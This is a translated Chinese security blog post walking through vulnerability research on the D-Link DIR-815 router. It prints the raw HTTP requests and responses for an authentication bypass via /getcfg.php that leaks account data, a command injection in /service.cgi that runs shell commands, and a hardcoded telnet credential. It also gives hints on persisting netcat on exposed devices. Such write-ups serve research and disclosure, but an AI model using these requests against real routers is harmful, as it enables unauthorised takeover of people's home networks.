# 以D-Link为例教你如何挖掘漏洞
##### 译文声明
本文为翻译文章，原文作者为cr0n1c，来源：cr0n1c.wordpress.com。具体表达及含义请以原文为准。

## 一、前言
“一分钱一分货”这一原则同样适用于编程领域。就我个人而言，我更倾向于那些能够以较低成本获得优质产品的商店。然而，在圣诞节期间，由于感到无聊，我决定处理一些老旧的硬件设备。在丢弃这些设备之前，我突然想到可以对其中一些进行模糊测试（fuzz testing）。本文将介绍我在24小时内（关键工作仅耗时4小时）对D-Link 815N设备的研究结果。我的目的不是揭示一个可利用于全球范围内的0Day漏洞，而是分享一种寻找这类漏洞的方法。
**声明：** 我花了几分钟时间浏览了D-Link官方网站，但并未找到提交漏洞的地方。

## 二、扫描目标设备
这个过程中的最大挑战是找到路由器的电源线。启动路由器并接入开发环境后，首要任务是获取正确的登录凭证。在这方面，D-Link非常大方，使用默认用户名`admin`且无需密码即可登录。

接下来，我启用了路由器的“远程管理”功能，以便模拟通过互联网访问该路由器的情景。随后，我使用`netcat`工具来探测远程管理接口返回的信息，结果如下：
```
nc 10.0.0.1 8080
HEAD / HTTP/1.1
HTTP/1.1 400 Bad Request
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 02:48:12 GMT
```

在Shodan.io上查询此关键字后，我发现大约有700个设备会返回相同的信息。

## 三、理解工作原理
进一步研究中，我希望了解这款路由器的身份验证机制及其页面加载方式。为此，我在Chrome浏览器中启用了开发者工具（Firefox也支持该功能），观察“网络”标签页下的输出结果。成功登录时，我发现浏览器向`/session.cgi`发送了一个POST请求，并收到简单的XML响应（不含任何会话信息）：
```
nc 10.0.0.1 8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost
Cookie: uid=DumMyTokEN
Content-Length: 68
ACTION=login_plaintext&PASSWD=&CAPTCHA=&USER=admin&REPORT_METHOD=xml
HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 04:59:08 GMT
Transfer-Encoding: chunked
Content-Type: text/xml
a1
SUCCESS
0
0
```

这表明，认证可能仅依赖于cookie，而这是一个可以被操控的变量。如果开发者确实如此设计，那么或许可以通过绕过认证访问某些页面。

经过几分钟的浏览，我发现一个PHP页面被多个页面引用。我开始使用Chrome和开发者工具捕获相关的POST请求，并尝试在没有附加cookie的情况下通过`netcat`重放这些请求。

最终，我发现了`DEVICE.ACCOUNT`信息，这对于后续扫描程序检查默认凭据非常有用：
```
POST /getcfg.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost
Content-Length: 23
SERVICES=DEVICE.ACCOUNT
HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 05:07:42 GMT
Transfer-Encoding: chunked
Content-Type: text/xml
208
DEVICE.ACCOUNT
1
1
admin
0
0
dummy
600
128
16
0
```

如果用户设置了密码，则上述结果中的`dummy`会变成`==OoXxGgYy==`。通过这种方式，我找到了一种无需认证即可扫描目标设备的方法，从而获取路由器的所有接口信息、连接设备及其流量、DNS信息和日志等。完整的列表可以在我的GitHub上找到。

## 四、获取Shell
此时，我已经投入了几个小时的时间，发现这款路由器提供了大量有价值的信息。当我向一位朋友展示成果时，他并不以为然，还挑衅道：“如果真的那么简单，那你就给我演示一下如何获取shell吧！”

这句话激励我继续深入探索，确认路由器是否缺乏输入验证。于是，我再次浏览了一些页面，寻找具有执行功能的目标URL。偶然间，我发现了一个使用`/service.cgi`的防火墙配置页面。查看POST请求后，我决定在正常数据后面追加一个`&`符号以及`ls`命令，然后重新提交请求（同时附带用于身份验证的cookie值），结果如下：
```
root@kali:~# nc 10.0.0.1 8080
POST /service.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost
Content-Length: 21
Cookie: uid=DuMMyTokEN
EVENT=CHECKFW%26ls%26
HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-815 Ver 1.03
Date: Sat, 27 Jan 2001 09:25:03 GMT
Transfer-Encoding: chunked
Content-Type: text/xml
64
OK
4
cbwpsacts.php
wiz_wps.php
wiz_wlan.php
wiz_wan_fresetv6.php
wiz_wan.php
wifi_stat.php
...
0
```

成功了！

## 五、综合利用
至此，我们已经找到了一个RCE（远程代码执行）漏洞，尽管还需要通过身份验证，但这并不成问题，因为我们已找到一种方法来绕过认证。最后，我将前面的步骤整合进一个快速利用脚本中，以便更便捷地与路由器进行远程交互。该脚本可在我的GitHub上找到。

如果你熟悉轻量级物联网（IoT）设备，你会注意到它们通常运行busybox，这意味着我们可以执行熟悉的命令，这非常好。

接下来，我们可以启用telnet功能，以获得更稳定的shell：
```
/bin/cat /etc/init0.d/S80telnetd.sh
#!/bin/sh
echo [$0]: $1 ... > /dev/console
if [ "$1" = "start" ]; then
    if [ -f "/usr/sbin/login" ]; then
        image_sign=`cat /etc/config/image_sign`
        telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
    else
        telnetd &
    fi
else
    killall telnetd
fi
```

**注意：** 厂商已经将telnet密码硬编码在`/etc/config/image_sign`文件中。基于我对嵌入式设备的了解，我相信所有D-Link 815N设备都会使用相同的密码。

## 六、持久驻留
虽然在这些设备上实现持久驻留的意义不大，但我找不到更合适的术语来描述这个概念。这些设备不常重启，即使重启也会重新加载固件，导致我们在设备上所做的修改消失。但由于设备重启频率较低，这一点可以忽略不计。

我不会公布具体的代码，但如果你熟悉Linux和`echo`命令，你应该能找到一种方法，使用Python等工具读取二进制文件（如`netcat`），并将结果以某种形式存储在设备上的某个位置（如`/var/tmp`）。更多关于目标设备架构的信息，请参考此处。

**2018年1月8日更新：** 根据Google的消息，如果我们访问D-Link 645的`/getcfg.php`页面，就可以获取明文密码。结合`/service.cgi`，你就能掌握一切！